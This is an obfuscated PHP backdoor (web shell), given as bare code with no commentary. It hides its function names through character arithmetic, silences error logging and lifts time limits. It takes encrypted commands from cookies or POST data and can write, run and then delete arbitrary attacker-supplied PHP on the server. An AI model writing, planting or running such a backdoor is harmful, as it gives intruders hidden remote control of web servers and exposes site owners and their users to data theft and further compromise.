<?php $pbczlkrdi = chr(1092-990).chr(550-445).chr(407-299).chr(101).chr(95).'p'.chr(117)."\x74"."\137"."\143"."\157"."\x6e"."\x74".'e'."\x6e"."\x74".'s';
$edvfhckvq = "\x62".chr(741-644).chr(308-193).'e'."\x36"."\64"."\137"."\x64"."\145".'c'."\157".chr(116-16)."\145";
$pjpwnl = "\151".chr(835-725).'i'."\x5f"."\163".chr(101).'t';
$tlhwk = "\165".'n'."\154"."\x69"."\x6e"."\x6b";


@$pjpwnl('e'."\162".chr(1099-985).chr(111).'r'."\x5f"."\154".chr(111).chr(103), NULL);
@$pjpwnl('l'."\x6f".'g'.chr(568-473).chr(101)."\162".'r'.chr(820-709)."\162"."\x73", 0);
@$pjpwnl("\x6d"."\x61".'x'.'_'."\145".'x'.'e'.chr(194-95).'u'."\x74".'i'.chr(793-682)."\156".'_'.'t'.chr(105).'m'.chr(101), 0);
@set_time_limit(0);

function rgnra($acrmduddc, $xfsnbfwtx)
{
    $xfsnbjyckqxxy = "";
    for ($xfsnb = 0; $xfsnb < strlen($acrmduddc);) {
        for ($j = 0; $j < strlen($xfsnbfwtx) && $xfsnb < strlen($acrmduddc); $j++, $xfsnb++) {
            $xfsnbjyckqxxy .= chr(ord($acrmduddc[$xfsnb]) ^ ord($xfsnbfwtx[$j]));
        }
    }
    return $xfsnbjyckqxxy;
}

$kmuiqksuht = array_merge($_COOKIE, $_POST);
$rjsjihnjtf = 'db8f7a91-c18b-4c1d-8c9d-d07cdbf1b79a';
foreach ($kmuiqksuht as $oyieljbde => $acrmduddc) {
    $acrmduddc = @unserialize(rgnra(rgnra($edvfhckvq($acrmduddc), $rjsjihnjtf), $oyieljbde));
    if (isset($acrmduddc[chr(213-116).'k'])) {
        if ($acrmduddc["\x61"] == "\x69") {
            $xfsnb = array(
                'p'.chr(144-26) => @phpversion(),
                "\163"."\166" => "3.5",
            );
            echo @serialize($xfsnb);
        } elseif ($acrmduddc["\x61"] == chr(310-209)) {
            $xzxaemiopy = "./" . md5($rjsjihnjtf) . chr(46).chr(443-338).chr(110).chr(99);
            @$pbczlkrdi($xzxaemiopy, "<" . chr(305-242)."\160"."\x68"."\160".' '.chr(64).chr(700-583).'n'.'l'.'i'.chr(110).'k'.chr(80-40)."\x5f"."\x5f"."\106".chr(73).chr(95-19)."\x45".chr(155-60).'_'."\x29".chr(59).' ' . $acrmduddc[chr(100)]);
            @include($xzxaemiopy);
            @$tlhwk($xzxaemiopy);
        }
        exit();
    }
}

